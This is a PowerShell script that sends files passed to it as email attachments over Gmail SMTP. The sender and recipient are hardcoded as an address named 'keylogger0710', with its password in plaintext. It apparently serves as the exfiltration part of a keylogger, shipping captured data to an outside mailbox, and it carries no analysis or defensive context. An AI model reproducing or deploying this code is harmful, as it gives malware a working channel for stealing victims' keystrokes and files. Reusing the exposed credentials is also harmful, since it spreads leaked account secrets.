Param( #parameters to our script

   [String]$Att,

   [String]$Subj,

   [String]$Body

)



Function Send-EMail {

    Param (

        [Parameter(`

            Mandatory=$true)]

        [String]$To,

         [Parameter(`

            Mandatory=$true)]

        [String]$From,

        [Parameter(`

            mandatory=$true)]

        [String]$Password,

        [Parameter(`

            Mandatory=$true)]

        [String]$Subject,

        [Parameter(`

            Mandatory=$true)]

        [String]$Body,

        [Parameter(`

            Mandatory=$true)]

        [String]$attachment

    )

    try

        {

            $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)

            $Srv = "smtp.gmail.com" 

            if ($attachment -ne $null) {

                try

                    {

                        $Attachments = $attachment -split ("\:\:");

                        ForEach ($val in $Attachments)

                            {

                                $attch = New-Object System.Net.Mail.Attachment($val)

                                $Msg.Attachments.Add($attch)

                            }

                    }

                catch

                    {

                        exit 2; #attachment not found, or.. dont have permission

                    }

            }

            $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL

            $Client.EnableSsl = $true 

            $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password); 

            $Client.Send($Msg)

            Remove-Variable -Name Client

            Remove-Variable -Name Password

            exit 7; #everything went OK

          }

      catch

          {

            exit 3; #error, there was something wrong :(

          }

} #End Function Send-EMail

try

    {

        Send-EMail -attachment $Att -To "keylogger0710@gmail.com" -Body $Body -Subject $Subj -password "qwert.050401" -From "keylogger0710@gmail.com"

    }

catch

    {

        exit 4; #Well calling of the function is wrong? not enough parameters

    }
